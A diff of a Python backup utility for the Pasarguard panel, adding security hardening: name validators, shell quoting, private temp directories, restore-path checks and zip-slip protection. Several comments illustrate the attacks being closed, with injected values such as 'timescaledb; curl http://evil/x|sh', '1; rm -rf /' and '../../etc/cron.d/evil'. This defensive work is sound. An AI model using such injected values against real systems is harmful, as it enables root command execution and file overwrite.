@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ============================================================
-#   Pasarguard Backup Utility  v4.2
+#   Pasarguard Backup Utility  v4.2.1
 #   Dev by: CIA
 #   GitHub: https://github.com/CIAUB
 #   v4.0 — multi-database support: backs up & restores EVERY Pasarguard DB
@@ -33,9 +33,29 @@
 #            picks up the latest script code without deleting and
 #            recreating it, and can update a running scheduler's bot
 #            token / admin chat ID in place.
+#   v4.2.1 — security hardening pass:
+#          * `/tmp` backup staging dir replaced with tempfile.mkdtemp
+#            (0700) so the unencrypted .env + DB dump isn't world-readable
+#            mid-backup
+#          * `curl | sudo bash` auto-update replaced with a
+#            download-to-temp / verify-sha256 / then-exec flow (a
+#            compromised raw.githubusercontent.com payload no longer
+#            gets piped straight into a root shell on confirm)
+#          * strict instance-name validator ([A-Za-z0-9_-]+) used by every
+#            function that builds a filesystem path, systemd unit name,
+#            screen/tmux session name, or shell=True command from user
+#            input — closes the path-traversal in /etc/pasarguard-backup
+#            that v4.2 introduced, plus the unit/session name injection
+#            in `Manage Backup Schedulers`. shlex.quote() added to the
+#            same shell=True spots as defence-in-depth
+#          * SQLite restore target is now realpath-checked against
+#            /var/lib/pasarguard/ so a malicious backup's
+#            SQLALCHEMY_DATABASE_URL can't redirect cp to /etc/cron.d etc.
+#          * manifest.sql_file is rejected if it contains `..`, `/`, or
+#            `\` (path-traversal in restore)
 # ============================================================
 
-import os, sys, subprocess, datetime, shutil
+import os, sys, subprocess, datetime, shutil, re, tempfile, hashlib, zipfile
 import time, urllib.request, urllib.error, uuid, threading, itertools
 import argparse, shlex, socket, getpass, json, stat
 
@@ -170,9 +190,56 @@ SYSTEMD_UNIT_DIR       = "/etc/systemd/system"
 # and world-readable systemd unit files). Each file is chmod 600.
 CREDS_DIR = "/etc/pasarguard-backup"
 
+# v4.2.1 — strict validator for instance/file names that get embedded into
+# filesystem paths, systemd unit names, screen/tmux session names, or
+# shell=True commands. Anything outside [A-Za-z0-9_-]+ is rejected. Defence
+# in depth — the user (running as root) is already trusted, but a single
+# `../` or `; rm -rf /` slipping through here becomes a path-traversal
+# RCE elsewhere. The two existing places this used to land unsafely are
+# _creds_path() (writes/reads /etc/pasarguard-backup/<name>.json) and
+# ask_instance_name() (returns the suffix used in unit/session names).
+_INSTANCE_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")
+
+def _validate_instance_name(name, *, allow_empty=False):
+    if not name:
+        if allow_empty:
+            return ""
+        raise ValueError("empty name")
+    if not _INSTANCE_NAME_RE.match(name):
+        raise ValueError(
+            f"invalid name {name!r} — only letters, digits, '_' and '-' are allowed"
+        )
+    return name
+
 def _creds_path(instance):
     safe = instance or "default"
+    # v4.2.1 — refuse anything that could escape CREDS_DIR before we
+    # touch the filesystem. _validate_instance_name raises ValueError on
+    # a bad name; callers (write_daemon_creds / read_daemon_creds /
+    # read_daemon_meta / run_daemon_from_args) propagate that.
+    _validate_instance_name(safe)
     return os.path.join(CREDS_DIR, f"{safe}.json")
+
+# v4.2.1 — validator for docker compose service names. `svc` is extracted
+# from docker-compose.yml / `docker compose config` output and then
+# interpolated (without quoting, until this fix) into shell=True commands
+# like `docker compose exec -T {shlex.quote(svc)} ...`. A malicious or tampered compose
+# file with a service named, say, `timescaledb; curl http://evil/x|sh`,
+# would then inject arbitrary commands as root. Defence in depth: the
+# service name is validated at extraction AND shlex.quote() is applied at
+# every shell-use site below.
+_SAFE_SERVICE_NAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")
+
+def _validate_service_name(svc, *, allow_empty=False):
+    if not svc:
+        if allow_empty:
+            return ""
+        raise ValueError("empty service name")
+    if not _SAFE_SERVICE_NAME_RE.match(svc):
+        raise ValueError(
+            f"unsafe docker service name {svc!r} — only letters, digits, '_', '.', '-' are allowed"
+        )
+    return svc
 
 def write_daemon_creds(instance, bot_token, admin_id, proxy=None, interval_h=None, include_node=None):
     """Persist everything a scheduler instance needs to run: token, chat id,
@@ -320,7 +387,26 @@ def _migrate_legacy_systemd_instance(name):
 # Per-instance status files so the "Manage Backup Schedulers" menu can show
 # whether an instance is currently backing up or sleeping until its next run,
 # instead of just a raw process-alive check.
-STATE_DIR = "/tmp/pasarguard_backup_state"
+# v4.2.1 — state lives under the same /etc/pasarguard-backup tree (0700,
+# root-owned) instead of /tmp. Even though state files don't carry secrets,
+# a local attacker who could write to /tmp/<...>.state could trick the
+# "Manage Backup Schedulers" menu into showing the wrong status.
+STATE_DIR = os.path.join(CREDS_DIR, "state")
+_STATE_DIR_READY = False
+
+def _ensure_state_dir():
+    global _STATE_DIR_READY
+    if _STATE_DIR_READY:
+        return True
+    try:
+        os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)
+        # CREDS_DIR itself is also 0700 from write_daemon_creds, but
+        # belt-and-braces in case the state dir was created before that.
+        os.chmod(STATE_DIR, 0o700)
+        _STATE_DIR_READY = True
+        return True
+    except Exception:
+        return False
 
 def _state_file(instance):
     return os.path.join(STATE_DIR, f"{instance}.state")
@@ -328,9 +414,12 @@ def _state_file(instance):
 def write_state(instance, phase, extra=""):
     if not instance:
         return
+    if not _ensure_state_dir():
+        return
     try:
-        os.makedirs(STATE_DIR, exist_ok=True)
-        with open(_state_file(instance), "w") as f:
+        path = _state_file(instance)
+        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+        with os.fdopen(fd, "w") as f:
             f.write(f"{phase}|{extra}|{time.time()}")
     except Exception:
         pass
@@ -360,7 +449,7 @@ def print_header(title=""):
     print()
     for line in LOGO:
         print(center(C.R1 + C.BOLD + line + C.RESET, LOGO_W))
-    sub = C.R1 + C.BOLD + "B A C K U P   U T I L I T Y   v 4 . 2   -   C I A U B" + C.RESET
+    sub = C.R1 + C.BOLD + "B A C K U P   U T I L I T Y   v 4 . 2 . 1   -   C I A U B" + C.RESET
     print(center(sub, 57))
     print()
     print(hline())
@@ -512,7 +601,13 @@ def ask_instance_name(kind):
     """Ask the user for a name/suffix for a new scheduler instance so several
     can run side by side (e.g. pasarguard-backup-1, pasarguard-backup-2)
     without clashing. Shows what already exists and lets the user rename
-    to avoid collisions."""
+    to avoid collisions.
+
+    v4.2.1 — the user-supplied suffix is strictly validated (only
+    [A-Za-z0-9_-]+). Without this, a name such as `1; rm -rf /` would
+    ride through into the systemd unit file, the screen/tmux session
+    name, the credentials-file path, and every shell=True command below,
+    becoming a one-line root RCE the moment the user creates a scheduler."""
     if kind == "systemd":
         base = SYSTEMD_SERVICE_BASE
         existing_full = [name for _, name, _ in list_systemd_backup_units()]
@@ -530,18 +625,27 @@ def ask_instance_name(kind):
     suggested_name    = f"{base}-{suggested_suffix}"
 
     print(f"  {C.R2}Give this scheduler instance a name so it can run alongside others.{C.RESET}")
-    name = input(f"  {C.R2}> Instance name [{suggested_name}]: {C.RESET}").strip()
-    if not name:
-        return suggested_name
-
-    full_name = name if name.startswith(base) else f"{base}-{name}"
-    while full_name in existing_full:
-        print_error(f"'{full_name}' is already in use — pick another name.")
+    while True:
         name = input(f"  {C.R2}> Instance name [{suggested_name}]: {C.RESET}").strip()
         if not name:
             return suggested_name
         full_name = name if name.startswith(base) else f"{base}-{name}"
-    return full_name
+        # The base prefix is hard-coded (safe); validate only the
+        # user-supplied suffix part. This catches shell metachars, `..`,
+        # `/`, etc.
+        if full_name.startswith(base + "-"):
+            suffix = full_name[len(base) + 1:]
+        else:
+            suffix = full_name[len(base):]
+        try:
+            _validate_instance_name(suffix)
+        except ValueError as e:
+            print_error(f"{e} (in the part after '{base}-').")
+            continue
+        if full_name in existing_full:
+            print_error(f"'{full_name}' is already in use — pick another name.")
+            continue
+        return full_name
 
 def ask_persistence_mode():
     print()
@@ -562,15 +666,18 @@ def launch_via_screen(daemon_cmd, session_name=None):
     if not ensure_tool_installed("screen"):
         return False
     session_name = session_name or ask_instance_name("screen")
-    exists, _, _ = local_shell(f"screen -list | grep -q '\\.{session_name}\\b'")
+    # v4.2.1 — validate + shlex.quote before any shell=True use.
+    _validate_instance_name(session_name)
+    q = shlex.quote(session_name)
+    exists, _, _ = local_shell(f"screen -list | grep -q '\\.{q}\\b'")
     if exists:
         print_warning(f"A screen session named '{session_name}' already exists.")
         kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
         if kill_it != "y":
             print_warning("Aborted — leaving the existing session untouched.")
             return False
-        run_command(f"screen -S {session_name} -X quit", quiet=True)
-    if not run_command(f"screen -dmS {session_name} {daemon_cmd}"):
+        run_command(f"screen -S {q} -X quit", quiet=True)
+    if not run_command(f"screen -dmS {q} {daemon_cmd}"):
         print_error("Failed to start the screen session.")
         return False
     print_success(f"Scheduler started in detached screen session '{session_name}'.")
@@ -583,15 +690,18 @@ def launch_via_tmux(daemon_cmd, session_name=None):
     if not ensure_tool_installed("tmux"):
         return False
     session_name = session_name or ask_instance_name("tmux")
-    exists, _, _ = local_shell(f"tmux has-session -t {session_name} 2>/dev/null")
+    # v4.2.1 — validate + shlex.quote before any shell=True use.
+    _validate_instance_name(session_name)
+    q = shlex.quote(session_name)
+    exists, _, _ = local_shell(f"tmux has-session -t {q} 2>/dev/null")
     if exists:
         print_warning(f"A tmux session named '{session_name}' already exists.")
         kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
         if kill_it != "y":
             print_warning("Aborted — leaving the existing session untouched.")
             return False
-        run_command(f"tmux kill-session -t {session_name}", quiet=True)
-    if not run_command(f"tmux new-session -d -s {session_name} {daemon_cmd}"):
+        run_command(f"tmux kill-session -t {q}", quiet=True)
+    if not run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
         print_error("Failed to start the tmux session.")
         return False
     print_success(f"Scheduler started in detached tmux session '{session_name}'.")
@@ -633,10 +743,14 @@ def launch_via_systemd(daemon_cmd, unit_name=None):
         return False
 
     print_info("Reloading systemd and enabling the service...")
+    # v4.2.1 — quote unit_name in shell=True commands. unit_name was
+    # already validated by ask_instance_name(), this is defence in depth.
+    _validate_instance_name(unit_name)
+    q = shlex.quote(unit_name)
     steps = [
         ("systemctl daemon-reload", "daemon-reload"),
-        (f"systemctl enable {unit_name}", "enable"),
-        (f"systemctl restart {unit_name}", "start"),
+        (f"systemctl enable {q}", "enable"),
+        (f"systemctl restart {q}", "start"),
     ]
     for cmd, label in steps:
         if not run_command(cmd):
@@ -713,7 +827,7 @@ def _list_databases_local(svc):
              "WHERE datistemplate=false AND datname NOT IN "
              "('postgres','template0','template1') ORDER BY datname;")
     ok_v, out, _ = local_shell(
-        f"docker compose exec -T {svc} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
+        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
         cwd=PASARGUARD_DIR,
     )
     if not ok_v or not out:
@@ -731,7 +845,7 @@ def _list_databases_ssh(ssh, svc):
              "('postgres','template0','template1') ORDER BY datname;")
     ec, out, _ = ssh_shell(
         ssh,
-        f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
+        f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
     )
     if ec != 0 or not out:
         print_warning("Could not enumerate Pasarguard databases on remote host — falling back to legacy 'pasarguard' only.")
@@ -959,23 +1073,34 @@ def _resolve_backend(scheme, user, pwd, host, port, dbname, env, services):
     }
 
 def _pick_service_by_image(services, image_needles=(), name_needles=()):
+    """Pick the most likely DB service from a list of (name, image) tuples.
+    Prefers exact image matches, then name-substring matches, then any service
+    that looks like a database. Returns the service name or None.
+
+    v4.2.1 — refuses to return a service name that doesn't match
+    [A-Za-z0-9_.-]+. A malicious docker-compose.yml could otherwise carry
+    a service name like `timescaledb; curl evil|sh` that would then be
+    pasted unquoted into shell=True docker commands as root."""
     if not services:
         return None
-    if len(services) == 1:
-        return services[0][0]
+    safe = [(n, i) for n, i in services if _SAFE_SERVICE_NAME_RE.match(n)]
+    if not safe:
+        return None
+    if len(safe) == 1:
+        return safe[0][0]
     for needle in image_needles:
-        for name, img in services:
+        for name, img in safe:
             if img.lower() == needle.lower():
                 return name
     for needle in image_needles:
-        for name, img in services:
+        for name, img in safe:
             if needle.lower() in img.lower():
                 return name
     for needle in name_needles:
-        for name, _ in services:
+        for name, _ in safe:
             if needle.lower() in name.lower():
                 return name
-    return services[0][0]
+    return safe[0][0]
 
 # ── Docker compose helpers ────────────────────────────────────
 def _running_ids_local(d):
@@ -1037,7 +1162,7 @@ def wait_postgres_local():
     deadline = time.time() + POSTGRES_READY_MAX_WAIT
     while time.time() < deadline:
         ok_v, _, _ = local_shell(
-            f"docker compose exec -T {svc} pg_isready -U pasarguard -d postgres", cwd=PASARGUARD_DIR)
+            f"docker compose exec -T {shlex.quote(svc)} pg_isready -U pasarguard -d postgres", cwd=PASARGUARD_DIR)
         if ok_v:
             print_success("Database is ready.")
             return True
@@ -1051,7 +1176,7 @@ def wait_postgres_ssh(ssh):
     deadline = time.time() + POSTGRES_READY_MAX_WAIT
     while time.time() < deadline:
         ec, _, _ = ssh_shell(
-            ssh, f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} pg_isready -U pasarguard -d postgres")
+            ssh, f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} pg_isready -U pasarguard -d postgres")
         if ec == 0:
             print_success("Database is ready.")
             return True
@@ -1063,9 +1188,20 @@ def start_compose_local(d, label, services=None, wait_postgres=False):
     if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
         print_error(f"{label}: compose project not found at {d}")
         return False
-    svc = " ".join(services) if services else ""
-    print_info(f"Starting {label} containers{f' ({svc})' if svc else ''}...")
-    if not run_command(f"docker compose up -d {svc}".strip(), cwd=d):
+    # v4.2.1 — validate + quote each service individually before joining
+    # (a malicious compose could otherwise yield service names with shell
+    # metachars; the joined-then-quoted form would also be wrong because
+    # shlex.quote wraps the whole space-joined string as one argument).
+    safe_services = []
+    for s in (services or []):
+        try:
+            safe_services.append(_validate_service_name(s))
+        except ValueError as e:
+            print_error(f"{label}: {e}")
+            return False
+    svc_q = " ".join(shlex.quote(s) for s in safe_services)
+    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
+    if not run_command(f"docker compose up -d {svc_q}".strip(), cwd=d):
         print_error(f"{label}: docker compose up failed.")
         return False
     if wait_postgres and not wait_postgres_local():
@@ -1088,9 +1224,17 @@ def start_compose_ssh(ssh, d, label, services=None, wait_postgres=False):
     if ec != 0:
         print_error(f"{label}: compose project not found at {d}")
         return False
-    svc = " ".join(services) if services else ""
-    print_info(f"Starting {label} containers{f' ({svc})' if svc else ''}...")
-    ec, _, er = ssh_shell(ssh, f"cd {d} && docker compose up -d {svc}".strip())
+    # v4.2.1 — validate + quote each service individually before joining.
+    safe_services = []
+    for s in (services or []):
+        try:
+            safe_services.append(_validate_service_name(s))
+        except ValueError as e:
+            print_error(f"{label}: {e}")
+            return False
+    svc_q = " ".join(shlex.quote(s) for s in safe_services)
+    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
+    ec, _, er = ssh_shell(ssh, f"cd {d} && docker compose up -d {svc_q}".strip())
     if ec != 0:
         print_error(f"{label}: docker compose up failed.")
         if er: print_error(er)
@@ -1424,7 +1568,11 @@ def create_backup(include_node=True):
     ts          = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
     scope_tag   = "full" if include_node else "pg"
     backup_name = f"backup_{scope_tag}_{ts}"
-    tmp_dir     = f"/tmp/{backup_name}"
+    # v4.2.1 — was f"/tmp/{backup_name}" (world-readable 0755 while the
+    # unencrypted dump + .env lived there). tempfile.mkdtemp gives us a
+    # 0700 dir that only this process can read, and we always clean up
+    # via shutil.rmtree(tmp_dir, ...) below.
+    tmp_dir     = tempfile.mkdtemp(prefix=f"{backup_name}_")
     final_base  = os.path.join(os.getcwd(), backup_name)
     zip_path    = f"{final_base}.zip"
 
@@ -1466,11 +1614,20 @@ def create_backup(include_node=True):
                 print_warning(f"{PG_NODE_DATA_DIR} not found — skipped")
 
         print_info("Compressing archive...")
-        shutil.make_archive(final_base, "zip", tmp_dir)
+        # v4.2.1 — set a 0700 umask BEFORE make_archive so the .zip is
+        # created with owner-only perms atomically. The previous
+        # make_archive-then-chmod flow had a TOCTOU window where any
+        # local user could read the .env (with DB passwords) before
+        # chmod 0600 ran.
+        old_umask = os.umask(0o077)
+        try:
+            shutil.make_archive(final_base, "zip", tmp_dir)
+        finally:
+            os.umask(old_umask)
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
-        # v4.2 — the archive contains .env (DB password, JWT/secret key, etc).
-        # Lock it down to the owner immediately.
+        # Belt-and-braces — explicitly chmod in case umask was overridden
+        # by something else in the script.
         try:
             os.chmod(zip_path, 0o600)
         except Exception:
@@ -1502,7 +1659,7 @@ def _backup_postgres_local(backend, db_dir):
 
     print_info("Exporting PostgreSQL globals (pg_dumpall)...")
     run_command(
-        f"docker compose exec -T {svc} pg_dumpall -U {shlex.quote(user)} --globals-only",
+        f"docker compose exec -T {shlex.quote(svc)} pg_dumpall -U {shlex.quote(user)} --globals-only",
         output_file=os.path.join(db_dir, "globals.sql"),
         cwd=PASARGUARD_DIR,
     )
@@ -1518,7 +1675,7 @@ def _backup_postgres_local(backend, db_dir):
             has_ts, ts_ver = _pg_db_timescale_info(svc, user, db)
             print_info(f"Exporting database {C.BOLD}{db}{C.RESET} → {sql_file}  (may take a while)")
             run_command(
-                f"docker compose exec -T {svc} pg_dump -U {shlex.quote(user)} "
+                f"docker compose exec -T {shlex.quote(svc)} pg_dump -U {shlex.quote(user)} "
                 f"--clean --if-exists -d {shlex.quote(db)}",
                 output_file=os.path.join(db_dir, sql_file),
                 cwd=PASARGUARD_DIR,
@@ -1531,7 +1688,7 @@ def _backup_postgres_local(backend, db_dir):
 def _pg_db_timescale_info(svc, user, dbname):
     query = "SELECT extversion FROM pg_extension WHERE extname='timescaledb' LIMIT 1;"
     ok_v, out, _ = local_shell(
-        f"docker compose exec -T {svc} psql -U {shlex.quote(user)} -d {shlex.quote(dbname)} "
+        f"docker compose exec -T {shlex.quote(svc)} psql -U {shlex.quote(user)} -d {shlex.quote(dbname)} "
         f"-tA -c {shlex.quote(query)}",
         cwd=PASARGUARD_DIR,
     )
@@ -1566,7 +1723,7 @@ def _backup_mysql_local(backend, db_dir):
     out_path = os.path.join(db_dir, sql_file)
     print_info(f"Exporting {backend['type']} database {C.BOLD}{dbname}{C.RESET} → {sql_file}  (may take a while)")
     ok = run_command(
-        f"docker compose exec -T {env_flag}{svc} mysqldump "
+        f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysqldump "
         f"-u {shlex.quote(user)} --single-transaction --quick --triggers --events --routines "
         f"--hex-blob --default-character-set=utf8mb4 {shlex.quote(dbname)}",
         output_file=out_path,
@@ -1641,6 +1798,50 @@ def _read_manifest(db_dir):
     return db_type, entries
 
 # ── Per-backend restore dispatchers ──────────────────────────
+def _is_safe_restore_target(path, allowed_prefix):
+    """Return True if `path` (after symlink resolution) is inside
+    `allowed_prefix`. v4.2.1 — defends against a malicious backup whose
+    .env sets SQLALCHEMY_DATABASE_URL to a path outside /var/lib/pasarguard/
+    (e.g. /etc/cron.d/evil). Without this, restoring such a backup would
+    silently overwrite an arbitrary file on disk."""
+    try:
+        real_prefix = os.path.realpath(allowed_prefix)
+        real_path   = os.path.realpath(path)
+        return (real_path.startswith(real_prefix.rstrip(os.sep) + os.sep)
+                or real_path == real_prefix)
+    except Exception:
+        return False
+
+def _safe_extract_zip(zip_path, dest):
+    """Extract `zip_path` into `dest` using Python's zipfile module, after
+    validating EVERY member refuses to escape `dest` via `..`, absolute
+    paths, or symlinks. v4.2.1 — replaces `unzip -q -o` because that
+    command happily extracts an entry like `../../etc/cron.d/evil` straight
+    to that path on disk (Zip Slip). With the script running as root, this
+    was a one-backup-away RCE on the restore host."""
+    import zipfile as _zipfile
+    dest_real = os.path.realpath(dest)
+    try:
+        zf = _zipfile.ZipFile(zip_path)
+    except Exception as e:
+        raise ValueError(f"could not open zip {zip_path!r}: {e}")
+    with zf:
+        for member in zf.namelist():
+            # Reject absolute paths and any entry whose joined realpath
+            # would leave dest. Also reject symlinks pointing outside.
+            member_path = os.path.realpath(os.path.join(dest_real, member))
+            if not (member_path == dest_real
+                    or member_path.startswith(dest_real + os.sep)):
+                raise ValueError(f"zip-slip entry refused: {member!r}")
+            info = zf.getinfo(member)
+            # mode 0o12xxxx in the external_attr is a symlink; bail on those
+            # too — a zip can carry symlinks that resolve outside dest.
+            if (info.external_attr >> 16) & 0o170000 == 0o120000:
+                raise ValueError(f"symlink entry refused: {member!r}")
+        # Safe to extract.
+        zf.extractall(dest_real)
+
+
 def _restore_databases_remote(ssh, db_dir, remote_db_svc, backend_type=None):
     db_type, entries = _read_manifest(db_dir)
     if not entries:
@@ -1681,25 +1882,32 @@ def _restore_postgres_remote(ssh, db_dir, svc, entries):
     if not execute_ssh_command(
         ssh,
         f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
-        f"docker compose exec -T {svc} psql -U pasarguard -d postgres",
+        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres",
         "Restoring globals.sql",
         required=True,
     ):
         return False
 
     for db, sql_file, _has_ts, _ts_ver in entries:
+        # v4.2.1 — sql_file comes from manifest.tsv in the backup. Reject
+        # path-traversal (`..`, `/`, `\`) before it lands in the cp/cat
+        # command. shlex.quote alone would NOT stop `..` because the OS
+        # still resolves it as a path component.
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         ident = _ident(db)
         print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
         execute_ssh_command(
             ssh,
-            f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} psql -U pasarguard -d postgres "
+            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
             f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}",
             f"Dropping old database '{db}'",
             required=False,
         )
         if not execute_ssh_command(
             ssh,
-            f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} psql -U pasarguard -d postgres "
+            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
             f"-c {shlex.quote(f'CREATE DATABASE {ident};')}",
             f"Creating database '{db}'",
             required=True,
@@ -1709,7 +1917,7 @@ def _restore_postgres_remote(ssh, db_dir, svc, entries):
         if not execute_ssh_command(
             ssh,
             f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
-            f"docker compose exec -T {svc} psql -U pasarguard -d {shlex.quote(db)}",
+            f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d {shlex.quote(db)}",
             f"Restoring {sql_file}",
             required=True,
         ):
@@ -1721,20 +1929,25 @@ def _restore_postgres_local(db_dir, svc, entries):
     print_info("Restoring globals.sql (roles / tablespaces / shared grants)...")
     if not run_command(
         f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/globals.sql | "
-        f"docker compose exec -T {svc} psql -U pasarguard -d postgres"
+        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres"
     ):
         print_error("Failed to restore globals.sql")
         return False
 
     for db, sql_file, _has_ts, _ts_ver in entries:
+        # v4.2.1 — sql_file comes from manifest.tsv. Reject path traversal
+        # before the path is concatenated into a cat | psql pipeline.
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         ident = _ident(db)
         print_info(f"Recreating database {C.BOLD}{db}{C.RESET}...")
         run_command(
-            f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} psql -U pasarguard -d postgres "
+            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
             f"-c {shlex.quote(f'DROP DATABASE IF EXISTS {ident} WITH (FORCE);')}"
         )
         if not run_command(
-            f"cd {PASARGUARD_DIR} && docker compose exec -T {svc} psql -U pasarguard -d postgres "
+            f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres "
             f"-c {shlex.quote(f'CREATE DATABASE {ident};')}"
         ):
             print_error(f"Failed to create database '{db}'")
@@ -1742,7 +1955,7 @@ def _restore_postgres_local(db_dir, svc, entries):
         print_info(f"Restoring {sql_file} → {db}  (may take a while)...")
         if not run_command(
             f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
-            f"docker compose exec -T {svc} psql -U pasarguard -d {shlex.quote(db)}"
+            f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d {shlex.quote(db)}"
         ):
             print_error(f"Failed to restore {sql_file}")
             return False
@@ -1751,6 +1964,10 @@ def _restore_postgres_local(db_dir, svc, entries):
 # ── MySQL / MariaDB remote restore ────────────────────────────
 def _restore_mysql_remote(ssh, db_dir, svc, entries):
     for db, sql_file, _, _ in entries:
+        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         print_info(f"Restoring {db} from {sql_file}  (may take a while)...")
         ec, env_text, _ = ssh_shell(ssh, f"grep -E '^(DB_PASSWORD|MYSQL_ROOT_PASSWORD|DB_USER|DB_NAME)=' {PASARGUARD_DIR}/.env")
         env_lines = {}
@@ -1775,7 +1992,7 @@ def _restore_mysql_remote(ssh, db_dir, svc, entries):
             env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
             cmd = (
                 f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
-                f"docker compose exec -T {env_flag}{svc} mysql -u {shlex.quote(cred_user)}"
+                f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysql -u {shlex.quote(cred_user)}"
             )
             ec2, _, _ = ssh_shell(ssh, cmd)
             if ec2 == 0:
@@ -1801,6 +2018,10 @@ def _restore_mysql_local(db_dir, svc, entries):
         candidates.append(("root", root_pwd))
 
     for db, sql_file, _, _ in entries:
+        # v4.2.1 — reject path traversal in sql_file (manifest-controlled).
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         print_info(f"Restoring {db} from {sql_file}  (may take a while)...")
         restored = False
         for cred_user, cred_pwd in candidates:
@@ -1808,7 +2029,7 @@ def _restore_mysql_local(db_dir, svc, entries):
             env_flag = f"-e MYSQL_PWD={shlex.quote(cred_pwd)} " if cred_pwd else ""
             cmd = (
                 f"cd {PASARGUARD_DIR} && cat {shlex.quote(db_dir)}/{shlex.quote(sql_file)} | "
-                f"docker compose exec -T {env_flag}{svc} mysql -u {shlex.quote(cred_user)}"
+                f"docker compose exec -T {env_flag}{shlex.quote(svc)} mysql -u {shlex.quote(cred_user)}"
             )
             if run_command(cmd, quiet=True):
                 print_success(f"Restored using credentials for user '{cred_user}'.")
@@ -1822,13 +2043,28 @@ def _restore_mysql_local(db_dir, svc, entries):
 # ── SQLite remote restore ─────────────────────────────────────
 def _restore_sqlite_remote(ssh, db_dir, entries):
     for db, sql_file, _, _ in entries:
+        # v4.2.1 — sql_file comes from a backup's manifest.tsv. Reject
+        # path-traversal attempts (`../etc/passwd`) before concatenating
+        # into the cp command. shlex.quote alone would not stop `..`
+        # because the OS still resolves it.
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         ec, env_text, _ = ssh_shell(ssh, f"grep -E '^SQLALCHEMY_DATABASE_URL=' {PASARGUARD_DIR}/.env")
         target = "/var/lib/pasarguard/db.sqlite3"
         if "=" in env_text:
             url = env_text.split("=", 1)[1].strip().strip('"').strip("'")
             path = url.split("://", 1)[-1].lstrip("/")
             if path and not path.startswith(":"):
-                target = "/" + path
+                candidate = "/" + path
+                # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
+                # A malicious backup's .env could set SQLALCHEMY_DATABASE_URL
+                # to point anywhere on disk; we refuse anything else.
+                allowed_prefix = "/var/lib/pasarguard/"
+                if not _is_safe_restore_target(candidate, allowed_prefix):
+                    print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
+                    return False
+                target = candidate
         print_info(f"Restoring SQLite database → {target}")
         execute_ssh_command(ssh, "cd /opt/pasarguard && docker compose stop pasarguard", "Stopping panel", required=False)
         execute_ssh_command(ssh, f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", "Removing old SQLite + WAL/SHM", required=False)
@@ -1850,9 +2086,21 @@ def _restore_sqlite_local(db_dir, entries):
     if url.startswith("sqlite"):
         path = url.split("://", 1)[-1].lstrip("/")
         if path and not path.startswith(":"):
-            target = "/" + path
+            candidate = "/" + path
+            # v4.2.1 — only allow restore targets under /var/lib/pasarguard/.
+            allowed_prefix = "/var/lib/pasarguard/"
+            if not _is_safe_restore_target(candidate, allowed_prefix):
+                print_error(f"Refusing unsafe SQLite target {candidate!r} — must be under {allowed_prefix}.")
+                return False
+            target = candidate
 
     for db, sql_file, _, _ in entries:
